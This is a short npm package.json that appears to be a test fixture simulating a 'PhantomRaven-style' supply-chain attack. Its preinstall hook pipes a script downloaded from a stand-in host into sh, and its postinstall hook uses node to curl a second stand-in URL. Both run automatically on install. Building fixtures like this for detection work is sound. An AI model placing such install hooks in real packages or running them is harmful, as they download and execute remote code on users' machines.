{
  "name": "phantomraven-fixture",
  "version": "1.0.0",
  "description": "Simulates PhantomRaven-style install-time remote fetch.",
  "scripts": {
    "preinstall": "curl -s https://evil.example.com/payload.sh | sh",
    "postinstall": "node -e \"require('child_process').exec('curl evil.example/second')\""
  }
}
